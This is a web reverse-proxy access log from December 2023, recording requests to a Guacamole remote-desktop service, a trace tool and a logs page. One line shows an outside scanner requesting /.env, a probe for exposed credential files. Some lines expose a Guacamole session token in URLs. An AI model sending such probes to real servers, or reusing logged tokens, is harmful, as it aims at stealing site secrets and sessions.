129.55.200.20 - - [18/Dec/2023:17:11:36 +0000] "GET /guacamole/images/action-icons/guac-back.svg HTTP/2.0" 200 258 "-" "-" 5896 "guacamole@docker" "http://172.18.0.10:8080" 4ms
129.55.200.20 - - [18/Dec/2023:17:11:36 +0000] "GET /guacamole/images/warning.svg HTTP/2.0" 200 1925 "-" "-" 5895 "guacamole@docker" "http://172.18.0.10:8080" 7ms
129.55.200.20 - - [18/Dec/2023:17:11:37 +0000] "GET /guacamole/images/user-icons/guac-user-white.svg HTTP/2.0" 200 635 "-" "-" 5898 "guacamole@docker" "http://172.18.0.10:8080" 1ms
129.55.200.20 - - [18/Dec/2023:17:11:37 +0000] "GET /guacamole/images/share-white.svg HTTP/2.0" 200 1088 "-" "-" 5899 "guacamole@docker" "http://172.18.0.10:8080" 1ms
129.55.200.20 - - [18/Dec/2023:17:11:37 +0000] "GET /guacamole/images/arrows/right.svg HTTP/2.0" 200 317 "-" "-" 5900 "guacamole@docker" "http://172.18.0.10:8080" 2ms
129.55.200.20 - - [18/Dec/2023:17:11:37 +0000] "GET /guacamole/app/element/templates/blank.html HTTP/2.0" 200 173 "-" "-" 5901 "guacamole@docker" "http://172.18.0.10:8080" 1ms
129.55.200.20 - - [18/Dec/2023:17:11:36 +0000] "GET /guacamole/api/session/data/mysql/connections/9 HTTP/2.0" 200 300 "-" "-" 5894 "guacamole@docker" "http://172.18.0.10:8080" 61ms
129.55.200.20 - - [18/Dec/2023:17:11:37 +0000] "GET /guacamole/api/session/tunnels/3844b501-3bde-3cba-8bc2-126a0bb5577a/protocol HTTP/2.0" 200 5172 "-" "-" 5903 "guacamole@docker" "http://172.18.0.10:8080" 52ms
129.55.200.20 - - [18/Dec/2023:17:11:37 +0000] "GET /guacamole/api/session/tunnels/3844b501-3bde-3cba-8bc2-126a0bb5577a/activeConnection/connection/sharingProfiles HTTP/2.0" 200 2 "-" "-" 5904 "guacamole@docker" "http://172.18.0.10:8080" 214ms
66.240.236.109 - - [18/Dec/2023:17:11:38 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 5905 "web-to-websecure@internal" "-" 0ms
129.55.200.20 - - [18/Dec/2023:17:11:50 +0000] "GET /trace HTTP/2.0" 404 548 "-" "-" 5906 "livetrace@docker" "http://172.18.0.3:80" 31ms
129.55.200.20 - - [18/Dec/2023:17:11:50 +0000] "GET /favicon.ico HTTP/2.0" 404 555 "-" "-" 5907 "www@docker" "http://172.18.0.9:80" 18ms
129.55.200.20 - - [18/Dec/2023:17:11:54 +0000] "GET /trace/ HTTP/2.0" 200 6036 "-" "-" 5908 "livetrace@docker" "http://172.18.0.3:80" 18ms
129.55.200.20 - - [18/Dec/2023:17:11:54 +0000] "GET /trace/styles.css?version=11 HTTP/2.0" 200 1367 "-" "-" 5909 "livetrace@docker" "http://172.18.0.3:80" 1ms
129.55.200.20 - - [18/Dec/2023:17:11:56 +0000] "GET /trace/startping.php?id=g5p9euuqj HTTP/2.0" 200 104 "-" "-" 5910 "livetrace@docker" "http://172.18.0.3:80" 10ms
129.55.200.20 - - [18/Dec/2023:17:11:56 +0000] "GET /trace/starttrace.php?id=8b6cl7x5n HTTP/2.0" 200 105 "-" "-" 5911 "livetrace@docker" "http://172.18.0.3:80" 10ms
129.55.200.20 - - [18/Dec/2023:17:11:57 +0000] "POST /guacamole/api/tokens HTTP/2.0" 200 171 "-" "-" 5912 "guacamole@docker" "http://172.18.0.10:8080" 10ms
129.55.200.20 - - [18/Dec/2023:17:11:37 +0000] "GET /guacamole/websocket-tunnel?token=52E574BC8664AF2DE59547B10E5359407EDF8A34404D00FEF907339FE9159D0B&GUAC_DATA_SOURCE=mysql&GUAC_ID=9&GUAC_TYPE=c&GUAC_WIDTH=4186&GUAC_HEIGHT=2844&GUAC_DPI=192&GUAC_TIMEZONE=America%2FNew_York&GUAC_AUDIO=audio%2FL8&GUAC_AUDIO=audio%2FL16&GUAC_IMAGE=image%2Fjpeg&GUAC_IMAGE=image%2Fpng&GUAC_IMAGE=image%2Fwebp HTTP/1.1" 0 0 "-" "-" 5902 "guacamole@docker" "http://172.18.0.10:8080" 20164ms
129.55.200.20 - - [18/Dec/2023:17:11:57 +0000] "GET /guacamole/images/circle-arrows.svg HTTP/2.0" 200 1408 "-" "-" 5914 "guacamole@docker" "http://172.18.0.10:8080" 2ms
129.55.200.20 - - [18/Dec/2023:17:11:57 +0000] "GET /guacamole/images/action-icons/guac-home.svg HTTP/2.0" 200 505 "-" "-" 5913 "guacamole@docker" "http://172.18.0.10:8080" 7ms
129.55.200.20 - - [18/Dec/2023:17:11:57 +0000] "GET /guacamole/images/action-icons/guac-logout.svg HTTP/2.0" 200 1464 "-" "-" 5915 "guacamole@docker" "http://172.18.0.10:8080" 7ms
129.55.200.20 - - [18/Dec/2023:17:11:57 +0000] "GET /trace/pollping.php?id=g5p9euuqj HTTP/2.0" 200 2 "-" "-" 5916 "livetrace@docker" "http://172.18.0.3:80" 2ms
129.55.200.20 - - [18/Dec/2023:17:11:57 +0000] "GET /trace/polltrace.php?id=8b6cl7x5n HTTP/2.0" 200 227 "-" "-" 5917 "livetrace@docker" "http://172.18.0.3:80" 2ms
129.55.200.20 - - [18/Dec/2023:17:11:58 +0000] "GET /trace/pollping.php?id=g5p9euuqj HTTP/2.0" 200 2 "-" "-" 5918 "livetrace@docker" "http://172.18.0.3:80" 1ms
129.55.200.20 - - [18/Dec/2023:17:11:58 +0000] "GET /trace/polltrace.php?id=8b6cl7x5n HTTP/2.0" 200 227 "-" "-" 5919 "livetrace@docker" "http://172.18.0.3:80" 2ms
129.55.200.20 - - [18/Dec/2023:17:11:59 +0000] "GET /trace/pollping.php?id=g5p9euuqj HTTP/2.0" 200 2 "-" "-" 5920 "livetrace@docker" "http://172.18.0.3:80" 2ms
129.55.200.20 - - [18/Dec/2023:17:11:59 +0000] "GET /trace/polltrace.php?id=8b6cl7x5n HTTP/2.0" 200 227 "-" "-" 5921 "livetrace@docker" "http://172.18.0.3:80" 2ms
129.55.200.20 - - [18/Dec/2023:17:12:00 +0000] "GET /trace/pollping.php?id=g5p9euuqj HTTP/2.0" 200 2 "-" "-" 5922 "livetrace@docker" "http://172.18.0.3:80" 1ms
129.55.200.20 - - [18/Dec/2023:17:12:00 +0000] "GET /trace/polltrace.php?id=8b6cl7x5n HTTP/2.0" 200 257 "-" "-" 5923 "livetrace@docker" "http://172.18.0.3:80" 2ms
129.55.200.20 - - [18/Dec/2023:17:12:01 +0000] "GET /trace/pollping.php?id=g5p9euuqj HTTP/2.0" 200 2 "-" "-" 5924 "livetrace@docker" "http://172.18.0.3:80" 1ms
129.55.200.20 - - [18/Dec/2023:17:12:01 +0000] "GET /trace/polltrace.php?id=8b6cl7x5n HTTP/2.0" 200 257 "-" "-" 5925 "livetrace@docker" "http://172.18.0.3:80" 1ms
129.55.200.20 - - [18/Dec/2023:17:12:02 +0000] "GET /trace/pollping.php?id=g5p9euuqj HTTP/2.0" 200 2 "-" "-" 5926 "livetrace@docker" "http://172.18.0.3:80" 1ms
129.55.200.20 - - [18/Dec/2023:17:12:02 +0000] "GET /trace/polltrace.php?id=8b6cl7x5n HTTP/2.0" 200 491 "-" "-" 5927 "livetrace@docker" "http://172.18.0.3:80" 2ms
129.55.200.20 - - [18/Dec/2023:17:12:03 +0000] "GET /trace/pollping.php?id=g5p9euuqj HTTP/2.0" 200 2 "-" "-" 5928 "livetrace@docker" "http://172.18.0.3:80" 3ms
129.55.200.20 - - [18/Dec/2023:17:12:03 +0000] "GET /trace/polltrace.php?id=8b6cl7x5n HTTP/2.0" 200 491 "-" "-" 5929 "livetrace@docker" "http://172.18.0.3:80" 2ms
129.55.200.20 - - [18/Dec/2023:17:12:06 +0000] "GET /trace/pollping.php?id=g5p9euuqj HTTP/2.0" 200 2 "-" "-" 5930 "livetrace@docker" "http://172.18.0.3:80" 3ms
129.55.200.20 - - [18/Dec/2023:17:12:06 +0000] "GET /trace/polltrace.php?id=8b6cl7x5n HTTP/2.0" 200 522 "-" "-" 5931 "livetrace@docker" "http://172.18.0.3:80" 1ms
129.55.200.20 - - [18/Dec/2023:17:12:06 +0000] "GET /trace/polltrace.php?id=8b6cl7x5n HTTP/2.0" 200 522 "-" "-" 5932 "livetrace@docker" "http://172.18.0.3:80" 2ms
129.55.200.20 - - [18/Dec/2023:17:12:06 +0000] "GET /trace/pollping.php?id=g5p9euuqj HTTP/2.0" 200 2 "-" "-" 5933 "livetrace@docker" "http://172.18.0.3:80" 1ms
129.55.200.20 - - [18/Dec/2023:17:12:06 +0000] "GET /trace/polltrace.php?id=8b6cl7x5n HTTP/2.0" 200 522 "-" "-" 5935 "livetrace@docker" "http://172.18.0.3:80" 1ms
129.55.200.20 - - [18/Dec/2023:17:12:06 +0000] "GET /trace/pollping.php?id=g5p9euuqj HTTP/2.0" 200 2 "-" "-" 5934 "livetrace@docker" "http://172.18.0.3:80" 3ms
129.55.200.20 - - [18/Dec/2023:17:12:07 +0000] "GET /trace/pollping.php?id=g5p9euuqj HTTP/2.0" 200 2 "-" "-" 5936 "livetrace@docker" "http://172.18.0.3:80" 1ms
129.55.200.20 - - [18/Dec/2023:17:12:07 +0000] "GET /trace/polltrace.php?id=8b6cl7x5n HTTP/2.0" 200 522 "-" "-" 5937 "livetrace@docker" "http://172.18.0.3:80" 1ms
129.55.200.20 - - [18/Dec/2023:17:12:08 +0000] "GET /trace/pollping.php?id=g5p9euuqj HTTP/2.0" 200 2 "-" "-" 5938 "livetrace@docker" "http://172.18.0.3:80" 2ms
129.55.200.20 - - [18/Dec/2023:17:12:08 +0000] "GET /trace/polltrace.php?id=8b6cl7x5n HTTP/2.0" 200 522 "-" "-" 5939 "livetrace@docker" "http://172.18.0.3:80" 1ms
129.55.200.20 - - [18/Dec/2023:17:12:09 +0000] "GET /trace/pollping.php?id=g5p9euuqj HTTP/2.0" 200 2 "-" "-" 5940 "livetrace@docker" "http://172.18.0.3:80" 1ms
129.55.200.20 - - [18/Dec/2023:17:12:09 +0000] "GET /trace/polltrace.php?id=8b6cl7x5n HTTP/2.0" 200 553 "-" "-" 5941 "livetrace@docker" "http://172.18.0.3:80" 1ms
129.55.200.20 - - [18/Dec/2023:17:12:10 +0000] "GET /trace/pollping.php?id=g5p9euuqj HTTP/2.0" 200 2 "-" "-" 5942 "livetrace@docker" "http://172.18.0.3:80" 1ms
129.55.200.20 - - [18/Dec/2023:17:12:10 +0000] "GET /trace/polltrace.php?id=8b6cl7x5n HTTP/2.0" 200 553 "-" "-" 5943 "livetrace@docker" "http://172.18.0.3:80" 1ms
129.55.200.20 - - [18/Dec/2023:17:12:11 +0000] "GET /trace/pollping.php?id=g5p9euuqj HTTP/2.0" 200 2 "-" "-" 5944 "livetrace@docker" "http://172.18.0.3:80" 1ms
129.55.200.20 - - [18/Dec/2023:17:12:11 +0000] "GET /trace/polltrace.php?id=8b6cl7x5n HTTP/2.0" 200 553 "-" "-" 5945 "livetrace@docker" "http://172.18.0.3:80" 1ms
129.55.200.20 - - [18/Dec/2023:17:12:12 +0000] "GET /trace/pollping.php?id=g5p9euuqj HTTP/2.0" 200 2 "-" "-" 5946 "livetrace@docker" "http://172.18.0.3:80" 1ms
129.55.200.20 - - [18/Dec/2023:17:12:12 +0000] "GET /trace/polltrace.php?id=8b6cl7x5n HTTP/2.0" 200 584 "-" "-" 5947 "livetrace@docker" "http://172.18.0.3:80" 1ms
129.55.200.20 - - [18/Dec/2023:17:12:13 +0000] "GET /trace/pollping.php?id=g5p9euuqj HTTP/2.0" 200 2 "-" "-" 5948 "livetrace@docker" "http://172.18.0.3:80" 2ms
129.55.200.20 - - [18/Dec/2023:17:12:13 +0000] "GET /trace/polltrace.php?id=8b6cl7x5n HTTP/2.0" 200 584 "-" "-" 5949 "livetrace@docker" "http://172.18.0.3:80" 1ms
129.55.200.20 - - [18/Dec/2023:17:12:14 +0000] "GET /trace/pollping.php?id=g5p9euuqj HTTP/2.0" 200 4 "-" "-" 5950 "livetrace@docker" "http://172.18.0.3:80" 2ms
129.55.200.20 - - [18/Dec/2023:17:12:14 +0000] "GET /trace/polltrace.php?id=8b6cl7x5n HTTP/2.0" 200 584 "-" "-" 5951 "livetrace@docker" "http://172.18.0.3:80" 1ms
129.55.200.20 - - [18/Dec/2023:17:12:14 +0000] "GET /trace/cleanping.php?id=g5p9euuqj HTTP/2.0" 200 71 "-" "-" 5952 "livetrace@docker" "http://172.18.0.3:80" 2ms
129.55.200.20 - - [18/Dec/2023:17:12:15 +0000] "GET /trace/polltrace.php?id=8b6cl7x5n HTTP/2.0" 200 615 "-" "-" 5953 "livetrace@docker" "http://172.18.0.3:80" 1ms
129.55.200.20 - - [18/Dec/2023:17:12:16 +0000] "GET /trace/polltrace.php?id=8b6cl7x5n HTTP/2.0" 200 615 "-" "-" 5954 "livetrace@docker" "http://172.18.0.3:80" 1ms
129.55.200.20 - - [18/Dec/2023:17:12:17 +0000] "GET /trace/polltrace.php?id=8b6cl7x5n HTTP/2.0" 200 615 "-" "-" 5955 "livetrace@docker" "http://172.18.0.3:80" 3ms
129.55.200.20 - - [18/Dec/2023:17:12:18 +0000] "GET /trace/polltrace.php?id=8b6cl7x5n HTTP/2.0" 200 646 "-" "-" 5956 "livetrace@docker" "http://172.18.0.3:80" 2ms
129.55.200.20 - - [18/Dec/2023:17:12:19 +0000] "GET /trace/polltrace.php?id=8b6cl7x5n HTTP/2.0" 200 646 "-" "-" 5957 "livetrace@docker" "http://172.18.0.3:80" 2ms
129.55.200.20 - - [18/Dec/2023:17:12:20 +0000] "GET /trace/polltrace.php?id=8b6cl7x5n HTTP/2.0" 200 646 "-" "-" 5958 "livetrace@docker" "http://172.18.0.3:80" 2ms
129.55.200.20 - - [18/Dec/2023:17:12:21 +0000] "GET /trace/polltrace.php?id=8b6cl7x5n HTTP/2.0" 200 677 "-" "-" 5959 "livetrace@docker" "http://172.18.0.3:80" 1ms
159.203.109.206 - - [18/Dec/2023:17:12:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5960 "www@docker" "http://172.18.0.9:80" 0ms
129.55.200.20 - - [18/Dec/2023:17:12:22 +0000] "GET /trace/polltrace.php?id=8b6cl7x5n HTTP/2.0" 200 677 "-" "-" 5961 "livetrace@docker" "http://172.18.0.3:80" 2ms
129.55.200.20 - - [18/Dec/2023:17:12:23 +0000] "GET /trace/polltrace.php?id=8b6cl7x5n HTTP/2.0" 200 677 "-" "-" 5962 "livetrace@docker" "http://172.18.0.3:80" 1ms
129.55.200.20 - - [18/Dec/2023:17:12:25 +0000] "GET /trace/polltrace.php?id=8b6cl7x5n HTTP/2.0" 200 708 "-" "-" 5963 "livetrace@docker" "http://172.18.0.3:80" 1ms
129.55.200.20 - - [18/Dec/2023:17:12:26 +0000] "POST /guacamole/api/tokens HTTP/2.0" 200 171 "-" "-" 5964 "guacamole@docker" "http://172.18.0.10:8080" 4ms
129.55.200.20 - - [18/Dec/2023:17:12:26 +0000] "GET /guacamole/api/session/data/mysql-shared/activeConnections HTTP/2.0" 200 2 "-" "-" 5966 "guacamole@docker" "http://172.18.0.10:8080" 6ms
129.55.200.20 - - [18/Dec/2023:17:12:26 +0000] "GET /guacamole/api/session/data/mysql/activeConnections HTTP/2.0" 200 2 "-" "-" 5965 "guacamole@docker" "http://172.18.0.10:8080" 80ms
129.55.200.20 - - [18/Dec/2023:17:12:27 +0000] "GET /trace/polltrace.php?id=8b6cl7x5n HTTP/2.0" 200 739 "-" "-" 5967 "livetrace@docker" "http://172.18.0.3:80" 1ms
129.55.200.20 - - [18/Dec/2023:17:12:27 +0000] "POST /guacamole/api/tokens HTTP/2.0" 200 171 "-" "-" 5968 "guacamole@docker" "http://172.18.0.10:8080" 5ms
129.55.200.20 - - [18/Dec/2023:17:12:28 +0000] "GET /guacamole/api/session/tunnels/2e355e36-7db6-340c-82ba-4534faf23f96/protocol HTTP/2.0" 200 5172 "-" "-" 5970 "guacamole@docker" "http://172.18.0.10:8080" 21ms
129.55.200.20 - - [18/Dec/2023:17:12:28 +0000] "GET /guacamole/api/session/tunnels/2e355e36-7db6-340c-82ba-4534faf23f96/activeConnection/connection/sharingProfiles HTTP/2.0" 200 2 "-" "-" 5971 "guacamole@docker" "http://172.18.0.10:8080" 232ms
129.55.200.20 - - [18/Dec/2023:17:12:30 +0000] "GET /trace/polltrace.php?id=8b6cl7x5n HTTP/2.0" 200 770 "-" "-" 5972 "livetrace@docker" "http://172.18.0.3:80" 2ms
129.55.200.20 - - [18/Dec/2023:17:12:31 +0000] "GET /trace/polltrace.php?id=8b6cl7x5n HTTP/2.0" 200 770 "-" "-" 5973 "livetrace@docker" "http://172.18.0.3:80" 1ms
129.55.200.20 - - [18/Dec/2023:17:12:33 +0000] "GET /trace/polltrace.php?id=8b6cl7x5n HTTP/2.0" 200 801 "-" "-" 5974 "livetrace@docker" "http://172.18.0.3:80" 1ms
129.55.200.20 - - [18/Dec/2023:17:12:35 +0000] "GET /trace/polltrace.php?id=8b6cl7x5n HTTP/2.0" 200 801 "-" "-" 5975 "livetrace@docker" "http://172.18.0.3:80" 2ms
167.71.120.76 - - [18/Dec/2023:17:12:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5976 "www@docker" "http://172.18.0.9:80" 0ms
129.55.200.20 - - [18/Dec/2023:17:12:37 +0000] "GET /trace/polltrace.php?id=8b6cl7x5n HTTP/2.0" 200 832 "-" "-" 5977 "livetrace@docker" "http://172.18.0.3:80" 1ms
129.55.200.20 - - [18/Dec/2023:17:12:38 +0000] "GET /trace/polltrace.php?id=8b6cl7x5n HTTP/2.0" 200 832 "-" "-" 5978 "livetrace@docker" "http://172.18.0.3:80" 2ms
129.55.200.20 - - [18/Dec/2023:17:12:39 +0000] "GET /trace/polltrace.php?id=8b6cl7x5n HTTP/2.0" 200 863 "-" "-" 5979 "livetrace@docker" "http://172.18.0.3:80" 2ms
129.55.200.20 - - [18/Dec/2023:17:12:40 +0000] "GET /trace/polltrace.php?id=8b6cl7x5n HTTP/2.0" 200 863 "-" "-" 5980 "livetrace@docker" "http://172.18.0.3:80" 2ms
129.55.200.20 - - [18/Dec/2023:17:12:41 +0000] "GET /trace/polltrace.php?id=8b6cl7x5n HTTP/2.0" 200 863 "-" "-" 5981 "livetrace@docker" "http://172.18.0.3:80" 2ms
129.55.200.20 - - [18/Dec/2023:17:12:42 +0000] "GET /trace/polltrace.php?id=8b6cl7x5n HTTP/2.0" 200 894 "-" "-" 5982 "livetrace@docker" "http://172.18.0.3:80" 1ms
129.55.200.20 - - [18/Dec/2023:17:12:43 +0000] "GET /logs HTTP/2.0" 301 169 "-" "-" 5983 "www@docker" "http://172.18.0.9:80" 1ms
129.55.200.20 - - [18/Dec/2023:17:12:43 +0000] "GET /logs/ HTTP/2.0" 200 1500 "-" "-" 5984 "www@docker" "http://172.18.0.9:80" 1ms
129.55.200.20 - - [18/Dec/2023:17:12:43 +0000] "GET /logs/styles.css?version=15 HTTP/2.0" 200 1642 "-" "-" 5985 "www@docker" "http://172.18.0.9:80" 1ms
129.55.200.20 - - [18/Dec/2023:17:12:43 +0000] "GET /logs/logtail.php HTTP/2.0" 200 2919 "-" "-" 5986 "www@docker" "http://172.18.0.9:80" 189ms
129.55.200.20 - - [18/Dec/2023:17:12:27 +0000] "GET /guacamole/websocket-tunnel?token=52E574BC8664AF2DE59547B10E5359407EDF8A34404D00FEF907339FE9159D0B&GUAC_DATA_SOURCE=mysql&GUAC_ID=9&GUAC_TYPE=c&GUAC_WIDTH=4186&GUAC_HEIGHT=2844&GUAC_DPI=192&GUAC_TIMEZONE=America%2FNew_York&GUAC_AUDIO=audio%2FL8&GUAC_AUDIO=audio%2FL16&GUAC_IMAGE=image%2Fjpeg&GUAC_IMAGE=image%2Fpng&GUAC_IMAGE=image%2Fwebp HTTP/1.1" 0 0 "-" "-" 5969 "guacamole@docker" "http://172.18.0.10:8080" 50797ms
129.55.200.20 - - [18/Dec/2023:17:13:18 +0000] "POST /guacamole/api/tokens HTTP/2.0" 200 171 "-" "-" 5987 "guacamole@docker" "http://172.18.0.10:8080" 7ms
159.203.109.206 - - [18/Dec/2023:17:13:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5988 "www@docker" "http://172.18.0.9:80" 1ms
129.55.200.20 - - [18/Dec/2023:17:13:34 +0000] "GET /guacamole/api/session/tunnels/7d984f38-319b-363b-bea4-6d0d08be5df4/protocol HTTP/2.0" 200 5172 "-" "-" 5990 "guacamole@docker" "http://172.18.0.10:8080" 47ms
129.55.200.20 - - [18/Dec/2023:17:13:34 +0000] "GET /guacamole/api/session/tunnels/7d984f38-319b-363b-bea4-6d0d08be5df4/activeConnection/connection/sharingProfiles HTTP/2.0" 200 2 "-" "-" 5991 "guacamole@docker" "http://172.18.0.10:8080" 266ms
167.71.120.76 - - [18/Dec/2023:17:13:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5992 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:17:14:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5993 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:17:14:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5994 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:17:15:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5995 "www@docker" "http://172.18.0.9:80" 1ms
162.142.125.224 - - [18/Dec/2023:17:15:27 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 5996 "web-to-websecure@internal" "-" 0ms
162.142.125.224 - - [18/Dec/2023:17:15:30 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 5997 "web-to-websecure@internal" "-" 0ms
162.142.125.224 - - [18/Dec/2023:17:15:33 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 5998 "-" "-" 0ms
167.71.120.76 - - [18/Dec/2023:17:15:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5999 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:17:16:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6000 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:17:16:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6001 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:17:17:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6002 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:17:17:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6003 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:17:18:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6004 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:17:18:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6005 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:17:19:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6006 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:17:19:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6007 "www@docker" "http://172.18.0.9:80" 1ms
95.214.235.169 - - [18/Dec/2023:17:19:53 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 6008 "web-to-websecure@internal" "-" 0ms
95.214.235.169 - - [18/Dec/2023:17:19:55 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 6009 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [18/Dec/2023:17:20:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6010 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:17:20:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6011 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:17:21:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6012 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:17:21:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6013 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:17:22:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6014 "www@docker" "http://172.18.0.9:80" 0ms
129.55.200.20 - - [18/Dec/2023:17:22:26 +0000] "GET /logs/ HTTP/2.0" 304 0 "-" "-" 6015 "www@docker" "http://172.18.0.9:80" 0ms
129.55.200.20 - - [18/Dec/2023:17:22:26 +0000] "GET /logs/logtail.php HTTP/2.0" 200 2374 "-" "-" 6016 "www@docker" "http://172.18.0.9:80" 26ms
167.71.120.76 - - [18/Dec/2023:17:22:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6017 "www@docker" "http://172.18.0.9:80" 0ms
129.55.200.20 - - [18/Dec/2023:17:23:02 +0000] "POST /guacamole/api/tokens HTTP/2.0" 200 171 "-" "-" 6018 "guacamole@docker" "http://172.18.0.10:8080" 6ms
129.55.200.20 - - [18/Dec/2023:17:13:34 +0000] "GET /guacamole/websocket-tunnel?token=52E574BC8664AF2DE59547B10E5359407EDF8A34404D00FEF907339FE9159D0B&GUAC_DATA_SOURCE=mysql&GUAC_ID=9&GUAC_TYPE=c&GUAC_WIDTH=4186&GUAC_HEIGHT=2844&GUAC_DPI=192&GUAC_TIMEZONE=America%2FNew_York&GUAC_AUDIO=audio%2FL8&GUAC_AUDIO=audio%2FL16&GUAC_IMAGE=image%2Fjpeg&GUAC_IMAGE=image%2Fpng&GUAC_IMAGE=image%2Fwebp HTTP/1.1" 0 0 "-" "-" 5989 "guacamole@docker" "http://172.18.0.10:8080" 568059ms
129.55.200.20 - - [18/Dec/2023:17:23:04 +0000] "GET /guacamole/api/session/tunnels/ce9a9fa2-12aa-3737-b4eb-9dc20d1800ae/protocol HTTP/2.0" 200 5172 "-" "-" 6020 "guacamole@docker" "http://172.18.0.10:8080" 55ms
129.55.200.20 - - [18/Dec/2023:17:23:04 +0000] "GET /guacamole/api/session/tunnels/ce9a9fa2-12aa-3737-b4eb-9dc20d1800ae/activeConnection/connection/sharingProfiles HTTP/2.0" 200 2 "-" "-" 6021 "guacamole@docker" "http://172.18.0.10:8080" 332ms
159.203.109.206 - - [18/Dec/2023:17:23:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6022 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:17:23:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6023 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:17:24:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6024 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:17:24:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6025 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:17:25:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6026 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:17:25:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6027 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:17:26:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6028 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:17:26:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6029 "www@docker" "http://172.18.0.9:80" 0ms
129.55.200.20 - - [18/Dec/2023:17:26:51 +0000] "GET /logs/ HTTP/2.0" 304 0 "-" "-" 6030 "www@docker" "http://172.18.0.9:80" 0ms
129.55.200.20 - - [18/Dec/2023:17:26:51 +0000] "GET /logs/logtail.php HTTP/2.0" 200 2963 "-" "-" 6031 "www@docker" "http://172.18.0.9:80" 28ms
159.203.109.206 - - [18/Dec/2023:17:27:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6032 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:17:27:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6033 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:17:28:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6034 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:17:28:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6035 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:17:29:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6036 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:17:29:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6037 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:17:30:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6038 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:17:30:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6039 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:17:31:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6040 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:17:31:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6041 "www@docker" "http://172.18.0.9:80" 0ms
